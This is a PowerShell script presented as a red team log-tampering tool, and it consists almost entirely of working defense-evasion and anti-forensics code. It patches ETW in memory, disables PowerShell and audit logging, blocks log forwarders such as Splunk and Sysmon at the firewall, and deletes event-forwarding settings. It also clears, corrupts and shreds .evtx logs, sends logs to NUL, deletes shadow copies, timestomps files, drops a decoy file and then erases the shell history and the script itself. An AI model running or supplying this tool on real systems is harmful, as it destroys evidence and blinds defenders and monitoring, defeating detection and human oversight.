<#
    RED TEAM LOG TAMPERING TOOL
    Capabilities: 
      - Zombie Mode (Log to NUL, service "alive")
      - WEF Kill + Forwarder Firewall Blocks
      - ETW Patch + PS Logging Disable
      - Log Shrink, Audit Kill, Wipe/Corrupt/Overwrite Options
      - EventLog Registry Kill
      - Timestomp, Decoy Drop, VSS Kill
      - Self-Destruct, History Wipe
#>

param(
    [Switch]$DisablePSLogging,
    [Switch]$BlockForwarders,
    [Switch]$KillWEF,
    [Switch]$ShrinkLogs,
    [Switch]$DisableAudit,
    [Switch]$WipeLogs,
    [Switch]$Corrupt,
    [Switch]$Zombie,
    [Switch]$NukeVSS,
    [Switch]$Timestomp,
    [Switch]$BlindETW,
    [Switch]$Decoy,
    [Switch]$SelfDestruct,
    [Switch]$All
)

# === MODULES ===

function Blind-ETW {
    Write-Host "[*] Attempting to patch ETW..."
    try {
        $Code = @"
        using System;
        using System.Runtime.InteropServices;
        public class ETWBypass {
            [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
            [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
            [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
        }
"@
        Add-Type -TypeDefinition $Code -PassThru | Out-Null
        $addr = [ETWBypass]::GetProcAddress([ETWBypass]::LoadLibrary("ntdll.dll"), "EtwEventWrite")
        $old = 0
        [ETWBypass]::VirtualProtect($addr, [UIntPtr]::new(5), 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::WriteByte($addr, [byte]0xc3)
        [ETWBypass]::VirtualProtect($addr, [UIntPtr]::new(5), $old, [ref]$old) | Out-Null
        Write-Host "[+] ETW Telemetry disabled" -ForegroundColor Green
    } catch {
        Write-Host "[-] ETW Patch failed" -ForegroundColor Red
    }
}

function Disable-PSLogging {
    Write-Host "[*] Disabling PowerShell logging..."
    $key = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (!(Test-Path $key)) { New-Item -Path $key -Force | Out-Null }
    Set-ItemProperty -Path $key -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
}

function Block-Forwarders {
    Write-Host "[*] Blocking known forwarder agents..."
    $agents = @("splunkd", "winlogbeat", "sysmon", "filebeat")
    foreach ($agent in $agents) {
        New-NetFirewallRule -DisplayName "Block_$agent" -Direction Outbound -Program "%ProgramFiles%\*$agent.exe" -Action Block -ErrorAction SilentlyContinue | Out-Null
    }
}

function Kill-WEF {
    Write-Host "[*] Killing Windows Event Forwarding configs..."
    $keys = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\EventForwarding"
    )
    foreach ($key in $keys) {
        if (Test-Path $key) {
            Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "   [+] Deleted: $key" -ForegroundColor Green
        }
    }
}

function Shrink-LogSize {
    Write-Host "[*] Shrinking Event Log Sizes..."
    $logs = @("Security", "System", "Application")
    foreach ($log in $logs) {
        Start-Process "wevtutil.exe" -ArgumentList "sl `"$log`" /ms:65536 /rt:false" -Wait -NoNewWindow
    }
}

function Disable-Audit {
    Write-Host "[*] Clearing audit policies..."
    auditpol /clear /y | Out-Null
    auditpol /set /category:* /success:disable /failure:disable | Out-Null
}

function Wipe-Logs-API {
    Write-Host "[*] Clearing logs using API..."
    $logs = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational")
    foreach ($log in $logs) {
        Start-Process "wevtutil.exe" -ArgumentList "cl `"$log`"" -Wait -NoNewWindow
    }
}

function Invoke-Corruption {
    Write-Host "[*] Corrupting .evtx headers..."
    Stop-Service -Name EventLog -Force -ErrorAction SilentlyContinue
    $dir = "C:\Windows\System32\winevt\Logs"
    Get-ChildItem "$dir\*.evtx" | ForEach-Object {
        try {
            $fs = [IO.File]::OpenWrite($_.FullName)
            $junk = [byte[]]::new(1024); (New-Object Random).NextBytes($junk)
            $fs.Write($junk, 0, 1024); $fs.Close()
            Write-Host "   [+] Corrupted: $($_.Name)" -ForegroundColor Green
        } catch {}
    }
}

function Secure-Overwrite-Logs {
    Write-Host "[*] Securely shredding .evtx logs..."
    $dir = "C:\Windows\System32\winevt\Logs"
    Get-ChildItem "$dir\*.evtx" | ForEach-Object {
        try {
            [IO.File]::WriteAllBytes($_.FullName, [byte[]]::new(1024))
            Remove-Item $_.FullName -Force
            Write-Host "   [+] Overwritten & Deleted: $($_.Name)" -ForegroundColor Gray
        } catch {}
    }
}

function Kill-EventService {
    Write-Host "[*] Killing EventLog Service and disabling restart..."
    $reg = "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog"
    if (Test-Path $reg) {
        Set-ItemProperty -Path $reg -Name "Start" -Value 4 -ErrorAction SilentlyContinue
    }
    $svc = Get-WmiObject Win32_Service -Filter "Name='EventLog'"
    if ($svc.State -eq 'Running') {
        try {
            Stop-Process -Id $svc.ProcessId -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

function Invoke-ZombieMode {
    Write-Host "[*] Activating ZOMBIE Mode (logs -> NUL)"
    $logs = @("Security", "System", "Application")
    $base = "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog"
    Stop-Service -Name EventLog -Force -ErrorAction SilentlyContinue
    foreach ($log in $logs) {
        Set-ItemProperty -Path "$base\$log" -Name "File" -Value "\??\NUL" -ErrorAction SilentlyContinue
    }
    Start-Service -Name EventLog -ErrorAction SilentlyContinue
}

function Timestomp-Logs {
    Write-Host "[*] Timestomping .evtx to match kernel32.dll..."
    $ts = (Get-Item "C:\Windows\System32\kernel32.dll").LastWriteTime
    Get-ChildItem "C:\Windows\System32\winevt\Logs\*.evtx" | ForEach-Object {
        try { $_.LastWriteTime = $ts; $_.CreationTime = $ts } catch {}
    }
}

function Invoke-Decoy {
    $path = "C:\Windows\Temp\Log_Maintenance_Report.txt"
    Set-Content -Path $path -Value "Maintenance Task Completed: $(Get-Date)"
    (Get-Item $path).LastWriteTime = Get-Date
    Write-Host "[+] Decoy dropped: $path" -ForegroundColor Cyan
}

function Invoke-SelfDestruct {
    Write-Host "[!] Self-destruct initiated..."
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
    Clear-History 2>$null
    Remove-Item -Path $PSCommandPath -Force -ErrorAction SilentlyContinue
    exit
}

function Nuke-VSS {
    Start-Process "vssadmin.exe" -ArgumentList "Delete Shadows /All /Quiet" -Wait -NoNewWindow
}

# === MAIN EXECUTION ===

if ($All) {
    Blind-ETW
    Disable-PSLogging
    Block-Forwarders
    Kill-WEF
    Invoke-Decoy
    Shrink-LogSize
    Disable-Audit
    Wipe-Logs-API

    Invoke-ZombieMode  # Stealthier than kill
    # Kill-EventService  # <- Uncomment to destroy service fully instead

    Secure-Overwrite-Logs
    Nuke-VSS
    Timestomp-Logs
    Invoke-SelfDestruct
}

# === Manual Flags ===
if ($BlindETW)         { Blind-ETW }
if ($DisablePSLogging) { Disable-PSLogging }
if ($BlockForwarders)  { Block-Forwarders }
if ($KillWEF)          { Kill-WEF }
if ($ShrinkLogs)       { Shrink-LogSize }
if ($DisableAudit)     { Disable-Audit }
if ($WipeLogs)         { Wipe-Logs-API }
if ($Corrupt)          { Invoke-Corruption }
if ($Zombie)           { Invoke-ZombieMode }
if ($NukeVSS)          { Nuke-VSS }
if ($Timestomp)        { Timestomp-Logs }
if ($Decoy)            { Invoke-Decoy }
if ($SelfDestruct)     { Invoke-SelfDestruct }
